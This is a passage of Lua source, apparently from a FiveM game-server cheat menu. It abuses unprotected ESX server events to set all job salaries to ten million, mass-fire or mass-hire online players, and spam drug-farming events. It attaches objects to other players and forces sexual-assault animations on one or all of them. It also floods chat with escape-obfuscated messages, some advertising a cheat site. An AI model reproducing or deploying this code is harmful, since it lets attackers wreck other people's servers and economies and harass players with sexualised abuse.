end

function EconomyDestroyer2()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'police',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'mecano',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'ambulance',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'realestateagent',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'cardealer',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'police',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'mecano',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'ambulance',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'realestateagent',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'cardealer',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'police',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'mecano',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'ambulance',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'realestateagent',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'cardealer',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'police',
            3,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'mecano',
            3,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'ambulance',
            3,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'realestateagent',
            3,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'cardealer',
            3,
            10000000
        )
    end
end

function UnemployedPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
                for i = 1, #ao, 1 do
                    label = ao[i].name
                    value = ao[i].source
                    name = ao[i].name
                    identifier = ao[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'unemployed',
                        0,
                        'fire'
                    )
                end
            end
        )
    end
end

function AmbulancePlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
                for i = 1, #ao, 1 do
                    label = ao[i].name
                    value = ao[i].source
                    name = ao[i].name
                    identifier = ao[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'ambulance',
                        3,
                        'hire'
                    )
                end
            end
        )
    end
end

function PolicePlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
                for i = 1, #ao, 1 do
                    label = ao[i].name
                    value = ao[i].source
                    name = ao[i].name
                    identifier = ao[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'police',
                        4,
                        'hire'
                    )
                end
            end
        )
    end
end

function MecanoPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
                for i = 1, #ao, 1 do
                    label = ao[i].name
                    value = ao[i].source
                    name = ao[i].name
                    identifier = ao[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'mecano',
                        4,
                        'hire'
                    )
                end
            end
        )
    end
end

function RealEstateAgentPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
                for i = 1, #ao, 1 do
                    label = ao[i].name
                    value = ao[i].source
                    name = ao[i].name
                    identifier = ao[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'realestateagent',
                        4,
                        'hire'
                    )
                end
            end
        )
    end
end

function TaxiPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
                for i = 1, #ao, 1 do
                    label = ao[i].name
                    value = ao[i].source
                    name = ao[i].name
                    identifier = ao[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'taxi',
                        4,
                        'hire'
                    )
                end
            end
        )
    end
end

function CarDealerPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
                for i = 1, #ao, 1 do
                    label = ao[i].name
                    value = ao[i].source
                    name = ao[i].name
                    identifier = ao[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'cardealer',
                        4,
                        'hire'
                    )
                end
            end
        )
    end
end

function UnemployedPlayer(bt)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
                local bu = nil
                for i = 1, #ao, 1 do
                    label = ao[i].name
                    value = ao[i].source
                    name = ao[i].name
                    if name == GetPlayerName(bt) then
                        bu = ao[i].identifier
                        debugLog('found ' .. ao[i].name .. ' ' .. ao[i].identifier)
                    end
                    identifier = ao[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bu,
                    'unemployed',
                    0,
                    'hire'
                )
            end
        )
    end
end

function CarDealerPlayer(bt)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
                local bu = nil
                for i = 1, #ao, 1 do
                    label = ao[i].name
                    value = ao[i].source
                    name = ao[i].name
                    if name == GetPlayerName(bt) then
                        bu = ao[i].identifier
                        debugLog('found ' .. ao[i].name .. ' ' .. ao[i].identifier)
                    end
                    identifier = ao[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bu,
                    'cardealer',
                    3,
                    'hire'
                )
            end
        )
    end
end

function RealEstateAgentPlayer(bt)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
                local bu = nil
                for i = 1, #ao, 1 do
                    label = ao[i].name
                    value = ao[i].source
                    name = ao[i].name
                    if name == GetPlayerName(bt) then
                        bu = ao[i].identifier
                        debugLog('found ' .. ao[i].name .. ' ' .. ao[i].identifier)
                    end
                    identifier = ao[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bu,
                    'realestateagent',
                    3,
                    'hire'
                )
            end
        )
    end
end

function TaxiPlayer(bt)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
                local bu = nil
                for i = 1, #ao, 1 do
                    label = ao[i].name
                    value = ao[i].source
                    name = ao[i].name
                    if name == GetPlayerName(bt) then
                        bu = ao[i].identifier
                        debugLog('found ' .. ao[i].name .. ' ' .. ao[i].identifier)
                    end
                    identifier = ao[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bu,
                    'taxi',
                    3,
                    'hire'
                )
            end
        )
    end
end

function AmbulancePlayer(bt)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
                local bu = nil
                for i = 1, #ao, 1 do
                    label = ao[i].name
                    value = ao[i].source
                    name = ao[i].name
                    if name == GetPlayerName(bt) then
                        bu = ao[i].identifier
                        debugLog('found ' .. ao[i].name .. ' ' .. ao[i].identifier)
                    end
                    identifier = ao[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bu,
                    'ambulance',
                    3,
                    'hire'
                )
            end
        )
    end
end

function PolicePlayer(bt)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
                local bu = nil
                for i = 1, #ao, 1 do
                    label = ao[i].name
                    value = ao[i].source
                    name = ao[i].name
                    if name == GetPlayerName(bt) then
                        bu = ao[i].identifier
                        debugLog('found ' .. ao[i].name .. ' ' .. ao[i].identifier)
                    end
                    identifier = ao[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bu,
                    'police',
                    3,
                    'hire'
                )
            end
        )
    end
end

function MecanoPlayer(bt)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(ao)
                local bu = nil
                for i = 1, #ao, 1 do
                    label = ao[i].name
                    value = ao[i].source
                    name = ao[i].name
                    if name == GetPlayerName(bt) then
                        bu = ao[i].identifier
                        debugLog('found ' .. ao[i].name .. ' ' .. ao[i].identifier)
                    end
                    identifier = ao[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bu,
                    'mecano',
                    3,
                    'hire'
                )
            end
        )
    end
end

function bananaparty()
    local bv = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
    local bw = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
    local bx = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
    AttachEntityToEntity(
        bv,
        GetPlayerPed(SelectedPlayer),
        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
        0.4,
        0,
        0,
        0,
        270.0,
        60.0,
        true,
        true,
        false,
        true,
        1,
        true
    )
    AttachEntityToEntity(
        bw,
        GetPlayerPed(SelectedPlayer),
        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
        0.4,
        0,
        0,
        0,
        270.0,
        60.0,
        true,
        true,
        false,
        true,
        1,
        true
    )
    AttachEntityToEntity(
        bx,
        GetPlayerPed(SelectedPlayer),
        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
        0.4,
        0,
        0,
        0,
        270.0,
        60.0,
        true,
        true,
        false,
        true,
        1,
        true
    )
end

function bananapartyall()
    Citizen.CreateThread(
        function()
            for by = 0, 9 do
                TriggerServerEvent(
                    '_chat:messageEntered',
                    '^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y',
                    {141, 211, 255},
                    '^' ..
                        by ..
                            '\76\121\110\120\32\56\32\126\32\119\119\119\46\108\121\110\120\109\101\110\117\46\99\111\109'
                )
            end
            for i = 0, 128 do
                local bv = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
                local bw = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
                local bx = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
                AttachEntityToEntity(
                    bv,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 57005),
                    0.4,
                    0,
                    0,
                    0,
                    270.0,
                    60.0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
                AttachEntityToEntity(
                    bw,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 57005),
                    0.4,
                    0,
                    0,
                    0,
                    270.0,
                    60.0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
                AttachEntityToEntity(
                    bx,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 57005),
                    0.4,
                    0,
                    0,
                    0,
                    270.0,
                    60.0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
            end
        end
    )
end

function rapeplayer()
    Citizen.CreateThread(
        function()
            RequestModelSync('a_m_o_acult_01')
            RequestAnimDict('rcmpaparazzo_2')
            while not HasAnimDictLoaded('rcmpaparazzo_2') do
                Citizen.Wait(0)
            end
            if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                while not NetworkHasControlOfEntity(veh) do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                end
                SetEntityAsMissionEntity(veh, true, true)
                DeleteVehicle(veh)
                DeleteEntity(veh)
            end
            count = -0.2
            for b = 1, 3 do
                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                local bz = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
                SetEntityAsMissionEntity(bz, true, true)
                AttachEntityToEntity(
                    bz,
                    GetPlayerPed(SelectedPlayer),
                    4103,
                    11816,
                    count,
                    0.00,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    false,
                    false,
                    false,
                    2,
                    true
                )
                ClearPedTasks(GetPlayerPed(SelectedPlayer))
                TaskPlayAnim(
                    GetPlayerPed(SelectedPlayer),
                    'rcmpaparazzo_2',
                    'shag_loop_poppy',
                    2.0,
                    2.5,
                    -1,
                    49,
                    0,
                    0,
                    0,
                    0
                )
                SetPedKeepTask(bz)
                TaskPlayAnim(bz, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                SetEntityInvincible(bz, true)
                count = count - 0.4
            end
        end
    )
end

function RapeAllFunc()
    for by = 0, 9 do
        TriggerServerEvent(
            '_chat:messageEntered',
            '^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y',
            {141, 211, 255},
            '^' .. by .. '\89\111\117\32\103\111\116\32\114\97\112\101\100\32\98\121\32\76\121\110\120\32\56'
        )
    end
    Citizen.CreateThread(
        function()
            for i = 0, 128 do
                RequestModelSync('a_m_o_acult_01')
                RequestAnimDict('rcmpaparazzo_2')
                while not HasAnimDictLoaded('rcmpaparazzo_2') do
                    Citizen.Wait(0)
                end
                if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                    local veh = GetVehiclePedIsIn(GetPlayerPed(i), true)
                    while not NetworkHasControlOfEntity(veh) do
                        NetworkRequestControlOfEntity(veh)
                        Citizen.Wait(0)
                    end
                    SetEntityAsMissionEntity(veh, true, true)
                    DeleteVehicle(veh)
                    DeleteEntity(veh)
                end
                count = -0.2
                for b = 1, 3 do
                    local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
                    local bz = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
                    SetEntityAsMissionEntity(bz, true, true)
                    AttachEntityToEntity(
                        bz,
                        GetPlayerPed(i),
                        4103,
                        11816,
                        count,
                        0.00,
                        0.0,
                        0.0,
                        0.0,
                        0.0,
                        false,
                        false,
                        false,
                        false,
                        2,
                        true
                    )
                    ClearPedTasks(GetPlayerPed(i))
                    TaskPlayAnim(GetPlayerPed(i), 'rcmpaparazzo_2', 'shag_loop_poppy', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                    SetPedKeepTask(bz)
                    TaskPlayAnim(bz, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                    SetEntityInvincible(bz, true)
                    count = count - 0.4
                end
            end
        end
    )
end
local function bA()
    local bB = KeyboardInput('Enter X pos', '', 100)
    local bC = KeyboardInput('Enter Y pos', '', 100)
    local bD = KeyboardInput('Enter Z pos', '', 100)
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
            drawNotification(
                '\126\103\126\84\101\108\101\112\111\114\116\101\100\32\116\111\32\99\111\111\114\100\115\33'
            )
        end
    else
        drawNotification('\126\114\126\73\110\118\97\108\105\100\32\99\111\111\114\100\115\33')
    end
end
local function bE()
    local name = KeyboardInput('Enter Blip Name', '', 100)
    if name == '' then
        drawNotification('\126\114\126\73\110\118\97\108\105\100\32\66\108\105\112\32\78\97\109\101\33')
        return bE()
    else
        local bB = KeyboardInput('Enter X pos', '', 100)
        local bC = KeyboardInput('Enter Y pos', '', 100)
        local bD = KeyboardInput('Enter Z pos', '', 100)
        if bB ~= '' and bC ~= '' and bD ~= '' then
            local bF = {{colour = 75, id = 84}}
            for _, bG in pairs(bF) do
                bG.blip = AddBlipForCoord(bB + 0.5, bC + 0.5, bD + 0.5)
                SetBlipSprite(bG.blip, bG.id)
                SetBlipDisplay(bG.blip, 4)
                SetBlipScale(bG.blip, 0.9)
                SetBlipColour(bG.blip, bG.colour)
                SetBlipAsShortRange(bG.blip, true)
                BeginTextCommandSetBlipName('STRING')
                AddTextComponentString(name)
                EndTextCommandSetBlipName(bG.blip)
            end
        else
            drawNotification('\126\114\126\73\110\118\97\108\105\100\32\99\111\111\114\100\115\33')
        end
    end
end
local function bH()
    local ar = GetPlayerPed(-1)
    local bI = GetEntityCoords(ar, true)
    local bJ = GetClosestVehicle(GetEntityCoords(ar, true), 1000.0, 0, 4)
    local bK = GetEntityCoords(bJ, true)
    local bL = GetClosestVehicle(GetEntityCoords(ar, true), 1000.0, 0, 16384)
    local bM = GetEntityCoords(bL, true)
    drawNotification('\126\121\126\87\97\105\116\46\46\46')
    Citizen.Wait(1000)
    if bJ == 0 and bL == 0 then
        drawNotification('\126\114\126\78\111\32\86\101\104\105\99\108\101\32\70\111\117\110\100')
    elseif bJ == 0 and bL ~= 0 then
        if IsVehicleSeatFree(bL, -1) then
            SetPedIntoVehicle(ar, bL, -1)
            SetVehicleAlarm(bL, false)
            SetVehicleDoorsLocked(bL, 1)
            SetVehicleNeedsToBeHotwired(bL, false)
        else
            local bN = GetPedInVehicleSeat(bL, -1)
            ClearPedTasksImmediately(bN)
            SetEntityAsMissionEntity(bN, 1, 1)
            DeleteEntity(bN)
            SetPedIntoVehicle(ar, bL, -1)
            SetVehicleAlarm(bL, false)
            SetVehicleDoorsLocked(bL, 1)
            SetVehicleNeedsToBeHotwired(bL, false)
        end
        drawNotification(
            '\126\103\126\84\101\108\101\112\111\114\116\101\100\32\73\110\116\111\32\78\101\97\114\101\115\116\32\86\101\104\105\99\108\101\33'
        )
    elseif bJ ~= 0 and bL == 0 then
        if IsVehicleSeatFree(bJ, -1) then
            SetPedIntoVehicle(ar, bJ, -1)
            SetVehicleAlarm(bJ, false)
            SetVehicleDoorsLocked(bJ, 1)
            SetVehicleNeedsToBeHotwired(bJ, false)
        else
            local bN = GetPedInVehicleSeat(bJ, -1)
            ClearPedTasksImmediately(bN)
            SetEntityAsMissionEntity(bN, 1, 1)
            DeleteEntity(bN)
            SetPedIntoVehicle(ar, bJ, -1)
            SetVehicleAlarm(bJ, false)
            SetVehicleDoorsLocked(bJ, 1)
            SetVehicleNeedsToBeHotwired(bJ, false)
        end
        drawNotification(
            '\126\103\126\84\101\108\101\112\111\114\116\101\100\32\73\110\116\111\32\78\101\97\114\101\115\116\32\86\101\104\105\99\108\101\33'
        )
    elseif bJ ~= 0 and bL ~= 0 then
        if Vdist(bK.x, bK.y, bK.z, bI.x, bI.y, bI.z) < Vdist(bM.x, bM.y, bM.z, bI.x, bI.y, bI.z) then
            if IsVehicleSeatFree(bJ, -1) then
                SetPedIntoVehicle(ar, bJ, -1)
                SetVehicleAlarm(bJ, false)
                SetVehicleDoorsLocked(bJ, 1)
                SetVehicleNeedsToBeHotwired(bJ, false)
            else
                local bN = GetPedInVehicleSeat(bJ, -1)
                ClearPedTasksImmediately(bN)
                SetEntityAsMissionEntity(bN, 1, 1)
                DeleteEntity(bN)
                SetPedIntoVehicle(ar, bJ, -1)
                SetVehicleAlarm(bJ, false)
                SetVehicleDoorsLocked(bJ, 1)
                SetVehicleNeedsToBeHotwired(bJ, false)
            end
        elseif Vdist(bK.x, bK.y, bK.z, bI.x, bI.y, bI.z) > Vdist(bM.x, bM.y, bM.z, bI.x, bI.y, bI.z) then
            if IsVehicleSeatFree(bL, -1) then
                SetPedIntoVehicle(ar, bL, -1)
                SetVehicleAlarm(bL, false)
                SetVehicleDoorsLocked(bL, 1)
                SetVehicleNeedsToBeHotwired(bL, false)
            else
                local bN = GetPedInVehicleSeat(bL, -1)
                ClearPedTasksImmediately(bN)
                SetEntityAsMissionEntity(bN, 1, 1)
                DeleteEntity(bN)
                SetPedIntoVehicle(ar, bL, -1)
                SetVehicleAlarm(bL, false)
                SetVehicleDoorsLocked(bL, 1)
                SetVehicleNeedsToBeHotwired(bL, false)
            end
        end
        drawNotification(
            '\126\103\126\84\101\108\101\112\111\114\116\101\100\32\73\110\116\111\32\78\101\97\114\101\115\116\32\86\101\104\105\99\108\101\33'
        )
    end
end
local function bO()
    if DoesBlipExist(GetFirstBlipInfoId(8)) then
        local bP = GetBlipInfoIdIterator(8)
        local blip = GetFirstBlipInfoId(8, bP)
        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
        wp = true
    else
        drawNotification('\126\114\126\78\111\32\119\97\121\112\111\105\110\116\33')
    end
    local bQ = 0.0
    height = 1000.0
    while true do
        Citizen.Wait(0)
        if wp then
            if
                IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                    GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
             then
                entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
            else
                entity = GetPlayerPed(-1)
            end
            SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
            FreezeEntityPosition(entity, true)
            local bR = GetEntityCoords(entity, true)
            if bQ == 0.0 then
                height = height - 25.0
                SetEntityCoords(entity, bR.x, bR.y, height)
                bool, bQ = GetGroundZFor_3dCoord(bR.x, bR.y, bR.z, 0)
            else
                SetEntityCoords(entity, bR.x, bR.y, bQ)
                FreezeEntityPosition(entity, false)
                wp = false
                height = 1000.0
                bQ = 0.0
                drawNotification(
                    '\126\103\126\84\101\108\101\112\111\114\116\101\100\32\116\111\32\119\97\121\112\111\105\110\116\33'
                )
                break
            end
        end
    end
end
local function bS()
    local bT =
        KeyboardInput('\69\110\116\101\114\32\86\101\104\105\99\108\101\32\83\112\97\119\110\32\78\97\109\101', '', 100)
    if bT and IsModelValid(bT) and IsModelAVehicle(bT) then
        RequestModel(bT)
        while not HasModelLoaded(bT) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(bT),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        SetPedIntoVehicle(PlayerPedId(-1), veh, -1)
    else
        drawNotification(
            '\126\114\126\126\104\126\77\111\100\101\108\32\105\115\32\110\111\116\32\118\97\108\105\100\33'
        )
    end
end
local function bU()
    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleUndriveable(vehicle, false)
end
local function bV()
    local veh = GetVehiclePedIsIn(GetPlayerPed(-1), false)
    if not DoesEntityExist(veh) then
        drawNotification(
            '\89\111\117\32\109\117\115\116\32\98\101\32\105\110\32\97\32\126\114\126\118\101\104\105\99\108\101\32\126\119\126\116\111\32\117\115\101\32\116\104\105\115\32\33'
        )
    else
        TriggerServerEvent(
            '\97\100\118\97\110\99\101\100\70\117\101\108\58\115\101\116\69\115\115\101\110\99\101',
            100,
            GetVehicleNumberPlateText(veh),
            GetDisplayNameFromVehicleModel(GetEntityModel(veh))
        )
        SetVehicleEngineOn(veh, true, false, false)
        SetVehicleUndriveable(veh, false)
    end
end
local function bW()
    local ar = GetPlayerPed(-1)
    local as = GetVehiclePedIsIn(ar, true)
    local f =
        KeyboardInput(
        '\69\110\116\101\114\32\116\104\101\32\112\108\97\116\101\32\108\105\99\101\110\115\101\32\121\111\117\32\119\97\110\116',
        '',
        100
    )
    if f ~= '' then
        SetVehicleNumberPlateText(as, f)
    end
end

function hweed()
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\87\101\101\100'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\87\101\101\100'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\87\101\101\100'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\87\101\101\100'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\87\101\101\100'
    )
end

function tweed()
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\87\101\101\100'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\87\101\101\100'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\87\101\101\100'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\87\101\101\100'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\87\101\101\100'
    )
end

function sweed()
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\87\101\101\100')
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\87\101\101\100')
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\87\101\101\100')
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\87\101\101\100')
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\87\101\101\100')
end

function hcoke()
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\67\111\107\101'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\67\111\107\101'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\67\111\107\101'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\67\111\107\101'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\67\111\107\101'
    )
end

function tcoke()
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\67\111\107\101'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\67\111\107\101'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\67\111\107\101'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\67\111\107\101'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\67\111\107\101'
    )
end

function scoke()
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\67\111\107\101')
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\67\111\107\101')
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\67\111\107\101')
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\67\111\107\101')
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\67\111\107\101')
end

function hmeth()
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\77\101\116\104'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\77\101\116\104'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\77\101\116\104'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\77\101\116\104'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\77\101\116\104'
    )
end

function tmeth()
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\77\101\116\104'
    )
    TriggerServerEvent(
